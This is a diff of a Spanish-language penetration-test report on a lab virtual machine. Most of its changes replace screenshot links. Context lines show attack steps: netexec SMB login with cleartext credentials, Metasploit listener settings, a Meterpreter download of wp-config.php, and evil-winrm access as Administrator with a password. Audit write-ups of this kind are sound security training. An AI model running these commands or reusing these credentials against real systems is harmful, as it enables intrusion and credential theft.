@@ -10,7 +10,8 @@ penetración realizada sobre la máquina virtual objetivo
 de ataque se realizó un escaneo de puertos sobre la máquina objetivo
 utilizando herramientas de reconocimiento**
 
-<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/38d9d716-6a19-4295-bd38-4c7698937541" />
+<img width="1123" height="566" alt="image" src="https://github.com/user-attachments/assets/8595f388-17cf-48ad-bb95-6dca426ba915" />
+
 
 
 Se detectaron los siguientes puertos abiertos:
@@ -174,7 +175,8 @@ WordPress:
 
 
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b3b0fb4a-4e15-4523-8e75-04a29eee8b2c" />
+<img width="1031" height="909" alt="image" src="https://github.com/user-attachments/assets/0ecbf1b7-1ec9-4f8d-aa62-6a768c43e5a5" />
+
 
 
 **Vulnerabilidades identificadas**\
@@ -444,7 +446,8 @@ credenciales contra el servicio SMB:
 
 **netexec smb 192.168.5.140 -u roldan -p \"QuesoManchego\"**
 
-<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/be603287-e246-4494-ab17-209100414df2" />
+<img width="1062" height="562" alt="image" src="https://github.com/user-attachments/assets/f665994c-7593-4883-8525-980d967114b1" />
+
 
 
 **Enumeración de usuarios y recursos**\
@@ -517,7 +520,8 @@ Se configuraron los siguientes parámetros:
 
 - LPORT: 4444
 
-<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/f041c86d-1e8b-4d7e-9ec4-9d93408a8a18" />
+<img width="1183" height="549" alt="image" src="https://github.com/user-attachments/assets/0dca61f4-a636-4203-9a4a-8d9846ed13d3" />
+
 
 
 **Justificación de la explotación**\
@@ -565,10 +569,11 @@ atacante mediante Meterpreter:\
 **download C:\\\\wamp64\\\\www\\\\wordpress\\\\wp-config.php**\
 El archivo fue transferido correctamente al sistema del auditor.
 
-<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/802be09f-5c89-4479-b1a8-dae1d3c09088" />
+<img width="999" height="602" alt="image" src="https://github.com/user-attachments/assets/8cfadd39-cb5f-44dc-bea1-216429307294" />
 
 
-<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/89f774aa-3504-4f9b-bd8b-6beeb757c197" />
+<img width="1185" height="590" alt="image" src="https://github.com/user-attachments/assets/ca8af1e5-953d-48b9-b22e-edc0f687b295" />
+
 
 
 El acceso previo al panel web no permitió visualizar este archivo debido
@@ -607,7 +612,7 @@ que se intentó el acceso remoto utilizando dichas credenciales.
 
 **evil-winrm -i 192.168.0.26 -u Administrator -p T00MuchW0rk70D0**
 
-<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/00d9a480-36f2-4f46-a430-ec3afd1182a2" />
+<img width="1208" height="571" alt="image" src="https://github.com/user-attachments/assets/4f10fe47-3bba-47ae-89d5-f75e7f964bf5" />
 
 
 **Clasificación de la vulnerabilidad**\
